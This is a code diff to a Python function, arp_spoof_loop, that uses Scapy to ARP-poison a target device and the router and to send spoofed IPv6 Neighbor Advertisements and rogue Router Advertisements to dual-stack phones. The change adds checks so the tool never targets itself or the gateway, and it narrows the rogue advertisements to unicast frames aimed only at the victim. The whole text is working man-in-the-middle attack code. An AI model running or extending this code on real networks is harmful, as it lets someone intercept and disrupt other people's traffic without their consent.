@@ -10,11 +10,27 @@ def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
     """
     Continuously send forged ARP replies and ICMPv6 NDP/RA spoofing packets:
       - IPv4: ARP-poisons target device and router so IPv4 traffic is captured.
-      - IPv6: Transmits ICMPv6 Router Advertisements with routerlifetime=0 & prefixlifetime=0
+      - IPv6: Transmits unicast ICMPv6 Router Advertisements with routerlifetime=0 & prefixlifetime=0
         originating from the router's link-local address, plus ICMPv6 Neighbor Advertisements (NA)
         with Override=1 to poison IPv6 neighbor caches on dual-stack devices (iPhone/iOS, Android).
     Uses Scapy on Windows via Npcap.
     """
+    from .network import get_all_local_ips_and_macs
+    all_ips, all_macs = get_all_local_ips_and_macs()
+    target_mac_clean = (target_mac or "").lower().replace("-", ":")
+    router_mac_clean = (router_mac or "").lower().replace("-", ":")
+    my_mac_clean = (my_mac or "").lower().replace("-", ":")
+
+    if (
+        not target_ip
+        or target_ip in ("-", "0.0.0.0", "127.0.0.1", router_ip)
+        or target_ip in all_ips
+        or target_mac_clean in all_macs
+        or target_mac_clean in (router_mac_clean, my_mac_clean)
+    ):
+        log.warning(f"Aborting arp_spoof_loop: target {target_ip} ({target_mac}) is self or gateway.")
+        return
+
     try:
         from scapy.all import Ether, ARP, sendp, conf as scapy_conf
         from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptPrefixInfo, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
@@ -54,7 +70,7 @@ def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
             ICMPv6NDOptDstLLAddr(lladdr=my_mac)
         )
 
-        # ── 3. IPv6 Rogue RA Deprecation Packets ───────────────────────────────────
+        # ── 3. IPv6 Rogue RA Deprecation Packets (Strictly Unicast to Target) ──────
         # Sourced from the router's real link-local address with routerlifetime=0
         ra_base = (
             IPv6(src=router_ipv6_ll, dst="ff02::1") /
@@ -74,7 +90,6 @@ def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
             )
 
         pkt_ra_unicast = Ether(dst=target_mac, src=my_mac) / ra_base
-        pkt_ra_multicast = Ether(dst="33:33:00:00:00:01", src=my_mac) / ra_base
 
         log.info(f"Dual-stack spoof started: {target_ip} ({target_mac})")
 
@@ -83,12 +98,11 @@ def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
                 # Send IPv4 ARP poison
                 sendp(pkt_to_target, iface=npf_iface, verbose=0)
                 sendp(pkt_to_router, iface=npf_iface, verbose=0)
-                # Send IPv6 NDP NA poison
+                # Send IPv6 NDP NA poison (unicast frames to target & router)
                 sendp(pkt_na_to_target, iface=npf_iface, verbose=0)
                 sendp(pkt_na_to_router, iface=npf_iface, verbose=0)
-                # Send IPv6 SLAAC/RA deprecation
+                # Send IPv6 SLAAC/RA deprecation (unicast frame to target only)
                 sendp(pkt_ra_unicast, iface=npf_iface, verbose=0)
-                sendp(pkt_ra_multicast, iface=npf_iface, verbose=0)
             except Exception as e:
                 log.debug(f"Spoof send error for {target_ip} (interface may be reconnecting): {e}")
                 npf_iface = get_scapy_interface(interface)
